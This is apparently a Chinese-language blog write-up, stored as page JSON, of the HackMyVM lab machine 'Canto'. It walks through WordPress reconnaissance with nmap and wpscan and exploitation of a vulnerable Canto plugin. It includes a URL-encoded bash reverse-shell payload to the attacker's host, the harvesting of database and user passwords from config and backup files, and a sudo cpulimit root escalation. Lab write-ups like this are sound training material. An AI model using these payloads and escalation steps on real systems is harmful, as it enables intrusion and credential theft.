{"pageProps":{"postData":{"id":"HackMyVMCanto","contentHtml":"<h1>Canto.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Canto\">https://hackmyvm.eu/machines/machine.php?vm=Canto</a></p>\n</blockquote>\n<p><strong>notes：Enjoy it!! ;)</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Canto nmap -sP 192.168.56.0/24                 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-15 22:50 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00019s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00012s latency).\nMAC Address: 08:00:27:05:4E:40 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.61\nHost is up (0.00022s latency).\nMAC Address: 08:00:27:80:95:AF (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 1.97 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Canto nmap -sT -min-rate 10000 -p- 192.168.56.61 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-15 22:52 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.61\nHost is up (0.0012s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:80:95:AF (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 4.09 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Canto nmap -sT -A -T4 -O -p 22,80 192.168.56.61                    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-15 22:54 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.61\nHost is up (0.0013s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 c6:af:18:21:fa:3f:3c:<span class=\"hljs-built_in\">fc</span>:9f:e4:ef:04:c9:16:cb:c7 (ECDSA)\n|_  256 ba:0e:8f:0b:24:20:dc:75:b7:1b:04:a1:81:b6:6d:64 (ED25519)\n80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))\n|_http-generator: WordPress 6.5.3\n|_http-server-header: Apache/2.4.57 (Ubuntu)\n|_http-title: Canto\nMAC Address: 08:00:27:80:95:AF (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   1.31 ms 192.168.56.61\n</code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p>访问主页，使用 <code>WordPress</code> 构建的</p>\n<p><img src=\"/post-images/HackMyVMCanto/image.png\" alt=\"image.png\"></p>\n<p>使用 <code>wpscan</code> 进行针对性扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Canto wpscan --url 192.168.56.61 --api-token bOauzGNYvhy6BU3DlHGCMVZmWJDqZH5tuFoHfsdk91o -e u,ap --plugins-detection mixed\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | <span class=\"hljs-string\">''</span>_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://192.168.56.61/ [192.168.56.61]\n[+] Started: Thu May 15 22:56:42 2025\n.....\n[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).\n | Found By: Rss Generator (Passive Detection)\n |  - http://192.168.56.61/index.php/feed/, &#x3C;generator>https://wordpress.org/?v=6.5.3&#x3C;/generator>\n |  - http://192.168.56.61/index.php/comments/feed/, &#x3C;generator>https://wordpress.org/?v=6.5.3&#x3C;/generator>\n |\n | [!] 3 vulnerabilities identified:\n |\n | [!] Title: WordPress &#x3C; 6.5.5 - Contributor+ Stored XSS <span class=\"hljs-keyword\">in</span> HTML API\n |     Fixed <span class=\"hljs-keyword\">in</span>: 6.5.5\n |     References:\n |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28\n |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/\n |\n | [!] Title: WordPress &#x3C; 6.5.5 - Contributor+ Stored XSS <span class=\"hljs-keyword\">in</span> Template-Part Block\n |     Fixed <span class=\"hljs-keyword\">in</span>: 6.5.5\n |     References:\n |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb\n |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/\n |\n | [!] Title: WordPress &#x3C; 6.5.5 - Contributor+ Path Traversal <span class=\"hljs-keyword\">in</span> Template-Part Block\n |     Fixed <span class=\"hljs-keyword\">in</span>: 6.5.5\n |     References:\n |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c\n |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/\n\n [+] WordPress theme <span class=\"hljs-keyword\">in</span> use: twentytwentyfour\n | Location: http://192.168.56.61/wp-content/themes/twentytwentyfour/\n | Last Updated: 2024-11-13T00:00:00.000Z\n | Readme: http://192.168.56.61/wp-content/themes/twentytwentyfour/readme.txt\n | [!] The version is out of <span class=\"hljs-built_in\">date</span>, the latest version is 1.3\n | [!] Directory listing is enabled\n | Style URL: http://192.168.56.61/wp-content/themes/twentytwentyfour/style.css\n | Style Name: Twenty Twenty-Four\n | Style URI: https://wordpress.org/themes/twentytwentyfour/\n | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...\n | Author: the WordPress team\n | Author URI: https://wordpress.org\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | Version: 1.1 (80% confidence)\n | Found By: Style (Passive Detection)\n ....\n [+] Enumerating All Plugins (via Passive and Aggressive Methods)    \n [+] canto\n | Location: http://192.168.56.61/wp-content/plugins/canto/\n | Last Updated: 2025-04-10T07:17:00.000Z\n | Readme: http://192.168.56.61/wp-content/plugins/canto/readme.txt\n | [!] The version is out of <span class=\"hljs-built_in\">date</span>, the latest version is 3.1.0\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://192.168.56.61/wp-content/plugins/canto/, status: 200\n |\n | [!] 4 vulnerabilities identified:\n |\n | [!] Title: Canto &#x3C; 3.0.9 - Unauthenticated Blind SSRF\n |     Fixed <span class=\"hljs-keyword\">in</span>: 3.0.9\n |     References:\n |      - https://wpscan.com/vulnerability/29c89cc9-ad9f-4086-a762-8896eba031c6\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28976\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28977\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28978\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24063\n |      - https://gist.github.com/p4nk4jv/87aebd999ce4b28063943480e95fd9e0\n |\n | [!] Title: Canto &#x3C; 3.0.5 - Unauthenticated Remote File Inclusion\n |     Fixed <span class=\"hljs-keyword\">in</span>: 3.0.5\n |     References:\n |      - https://wpscan.com/vulnerability/9e2817c7-d4aa-4ed9-a3d7-18f3117ed810\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3452\n |\n | [!] Title: Canto &#x3C; 3.0.7 - Unauthenticated RCE\n |     Fixed <span class=\"hljs-keyword\">in</span>: 3.0.7\n |     References:\n |      - https://wpscan.com/vulnerability/1595af73-6f97-4bc9-9cb2-14a55daaa2d4\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25096\n |      - https://patchstack.com/database/vulnerability/canto/wordpress-canto-plugin-3-0-6-unauthenticated-remote-code-execution-rce-vulnerability\n |\n | [!] Title: Canto &#x3C; 3.0.9 - Unauthenticated Remote File Inclusion\n |     Fixed <span class=\"hljs-keyword\">in</span>: 3.0.9\n |     References:\n |      - https://wpscan.com/vulnerability/3ea53721-bdf6-4203-b6bc-2565d6283159\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4936\n | [!] Title: Canto &#x3C; 3.0.9 - Unauthenticated Remote File Inclusion\n |     Fixed <span class=\"hljs-keyword\">in</span>: 3.0.9\n |     References:\n |      - https://wpscan.com/vulnerability/3ea53721-bdf6-4203-b6bc-2565d6283159\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4936\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/95a68ae0-36da-499b-a09d-4c91db8aa338 \n |\n | Version: 3.0.4 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://192.168.56.61/wp-content/plugins/canto/readme.txt\n | Confirmed By: Composer File (Aggressive Detection)\n |  - http://192.168.56.61/wp-content/plugins/canto/package.json, Match: <span class=\"hljs-string\">''</span>3.0.4<span class=\"hljs-string\">'\n</span></code></pre>\n<p>扫描出好几个漏洞，其中插件 <code>Canto</code> 存在 <code>RCE</code> 漏洞</p>\n<h3>Canto RCE - CVE-2023-3452</h3>\n<p><a href=\"https://github.com/leoanggal1/CVE-2023-3452-PoC\">https://github.com/leoanggal1/CVE-2023-3452-PoC</a></p>\n<p><img src=\"/post-images/HackMyVMCanto/image1.png\" alt=\"image.png\"></p>\n<p>进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.56.4%2F1234+0%3E%261%27\n</code></pre>\n<p><img src=\"/post-images/HackMyVMCanto/image2.png\" alt=\"image.png\"></p>\n<h2>提权 - To Erik</h2>\n<h3>信息收集</h3>\n<p>查看配置文件 <code>wp-config.php</code></p>\n<pre><code class=\"hljs language-bash\">/** The name of the database <span class=\"hljs-keyword\">for</span> WordPress */\ndefine( <span class=\"hljs-string\">'DB_NAME'</span>, <span class=\"hljs-string\">'wordpress'</span> ); \n/** Database username */\ndefine( <span class=\"hljs-string\">'DB_USER'</span>, <span class=\"hljs-string\">'wordpress'</span> );\n                                                    \n/** Database password */           \ndefine( <span class=\"hljs-string\">'DB_PASSWORD'</span>, <span class=\"hljs-string\">'2NCVjoWVE9iwxPz'</span> );\n</code></pre>\n<p><code>mysql</code> 数据收集</p>\n<pre><code class=\"hljs language-bash\">www-data@canto:/var/www/html$ mysql -uwordpress -p\nEnter password: \nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection <span class=\"hljs-built_in\">id</span> is 69\nServer version: 8.0.36-0ubuntu0.23.10.1 (Ubuntu)\n\nCopyright (c) 2000, 2024, Oracle and/or its affiliates.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType <span class=\"hljs-string\">'help;'</span> or <span class=\"hljs-string\">'\\h'</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span>. Type <span class=\"hljs-string\">'\\c'</span> to clear the current input statement.\n\nmysql> \n</code></pre>\n<pre><code class=\"hljs language-bash\">mysql> <span class=\"hljs-keyword\">select</span> * from wp_users;\n+----+------------+------------------------------------+---------------+----------------+---------------------+---------------------+---------------------+-------------+--------------+\n| ID | user_login | user_pass                          | user_nicename | user_email     | user_url            | user_registered     | user_activation_key | user_status | display_name |\n+----+------------+------------------------------------+---------------+----------------+---------------------+---------------------+---------------------+-------------+--------------+\n|  1 | erik       | $P<span class=\"hljs-variable\">$BZk2jE4XrC91HKgRS83h0gICjM0bcB</span>. | erik          | <span class=\"hljs-built_in\">test</span>@gmail.com | http://192.168.1.36 | 2024-05-12 11:16:07 |                     |           0 | erik         |\n+----+------------+------------------------------------+---------------+----------------+---------------------+---------------------+---------------------+-------------+--------------+\n1 row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.00 sec)\n</code></pre>\n<p>使用 <code>John</code> 进行爆破无果</p>\n<p><code>在erik用户家目录能找到</code> <code>notes</code> 文件夹</p>\n<pre><code class=\"hljs language-bash\">www-data@canto:/home/erik/notes$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 16\ndrwxrwxr-x 2 erik erik     4096 May 12  2024 .\ndrwxr-xr-- 5 erik www-data 4096 May 12  2024 ..\n-rw-rw-r-- 1 erik erik       68 May 12  2024 Day1.txt\n-rw-rw-r-- 1 erik erik       71 May 12  2024 Day2.txt\nwww-data@canto:/home/erik/notes$ <span class=\"hljs-built_in\">cat</span> Day\n<span class=\"hljs-built_in\">cat</span>: Day: No such file or directory\nwww-data@canto:/home/erik/notes$ <span class=\"hljs-built_in\">cat</span> Day1.txt \nOn the first day I have updated some plugins and the website theme.\nwww-data@canto:/home/erik/notes$ <span class=\"hljs-built_in\">cat</span> Day2.txt \nI almost lost the database with my user so I created a backups folder.\n</code></pre>\n<p>寻找 <code>backups</code> 文件夹</p>\n<pre><code class=\"hljs language-bash\">www-data@canto:/home/erik$ find / -name backups 2>/dev/null\n/snap/core22/1380/var/backups\n/snap/core22/864/var/backups\n/var/backups\n/var/wordpress/backups\n</code></pre>\n<p><code>下面存在一个txt文件，里面是</code> <code>erik</code> 用户的密码</p>\n<pre><code class=\"hljs language-bash\">www-data@canto:/var/wordpress/backups$ <span class=\"hljs-built_in\">cat</span> 12052024.txt \n------------------------------------\n| Users     |      Password        |\n------------|----------------------|\n| erik      | th1sIsTheP3ssw0rd!   |\n------------------------------------\n</code></pre>\n<pre><code class=\"hljs language-bash\">erik@canto:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nd41d8cd98f00b204e9800998ecf8427e\n</code></pre>\n<h2>提权 - To Root</h2>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">erik@canto:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> erik on canto:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser erik may run the following commands on canto:\n    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit\n</code></pre>\n<p><a href=\"https://gtfobins.github.io/gtfobins/cpulimit/\">https://gtfobins.github.io/gtfobins/cpulimit/</a></p>\n<p><img src=\"/post-images/HackMyVMCanto/image3.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">erik@canto:~$ <span class=\"hljs-built_in\">sudo</span> cpulimit -l 100 -f /bin/sh\nProcess 1300 detected\n<span class=\"hljs-comment\"># id</span>\nuid=0(root) gid=0(root) <span class=\"hljs-built_in\">groups</span>=0(root)\n</code></pre>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># cat root.txt</span>\n1b56eefaab2c896e57c874a635b24b49\n</code></pre>","title":"HackMyVM - Canto","date":"2025-05-16","updated":"2025-05-16","tags":["HackMyVM","Linux靶机","WordPress"],"categories":"靶机","comments":true,"description":"Canto.\n\n https://hackmyvm.eu/machines/machine.php?vm=Canto\n \n\nnotes：Enjoy it!! ;)\n\n前期踩点\n\n\n\n\n\n\n\nWeb 渗透\n\n信息收集\n\n访问主页，使用 `WordPress` 构建的\n\n\n\n使用 `wpscan` 进行针对性扫描\n\n\n\n扫描出好几个漏洞，其中插件 `Canto` 存在 `RCE` 漏洞\n\nCanto ..."},"recentPosts":[{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"},{"id":"TheHackersLabsHellRoot","title":"TheHackersLabs - HellRoot","date":"2025-08-02","isEncrypted":false,"year":"2025","month":"08","day":"02"},{"id":"群U靶机 - Cliv2","title":"群U靶机 - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsMerchan","title":"TheHackersLabs - Merchan","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"},{"id":"HackTheBoxSeason7-Cypher","title":"HackTheBox - Season7 - Cypher","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"07","day":"29"}]},"__N_SSG":true}